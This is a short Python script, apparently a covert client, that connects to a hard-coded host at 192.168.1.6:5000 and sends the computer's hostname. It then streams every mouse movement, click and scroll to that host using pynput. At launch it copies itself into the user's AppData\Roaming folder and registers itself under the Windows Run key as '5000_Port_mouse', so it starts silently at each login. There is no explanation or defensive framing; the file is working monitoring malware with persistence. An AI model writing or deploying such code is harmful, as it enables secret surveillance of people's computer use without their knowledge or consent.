def main():
    import socket
    from pynput import mouse

    HOST = "192.168.1.6"
    PORT = 5000
    FORMAT = "utf-8"
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.send(socket.gethostname().encode())
        while True:
            try:
                def on_move(x, y):
                    s.send(f"({x}, {y})".encode(FORMAT))

                def on_click(x, y, button, pressed):
                    if not pressed:
                        s.send(b"false")
                    s.send(b"true")

                def on_scroll(x, y, dx, dy):
                    if dy < 0:
                        s.send(b'down')
                    else:
                        s.send(b'up')
                        
                with mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener:
                    listener.join()
            
            except ConnectionResetError:
                exit(1)
            except ConnectionRefusedError:
                exit(1)
            except OSError:
                exit(1)

if __name__ == "__main__":
    import winreg
    import os
    username = os.getlogin()
    os.system(f"copy client_mouse.exe C:\\Users\\{username}\\AppData\\Roaming")
    key = winreg.HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    winreg.SetValueEx(winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS), "5000_Port_mouse", 0, winreg.REG_SZ, f"C:\\Users\\{username}\\AppData\\Roaming\\client_mouse.exe")
    
    main()
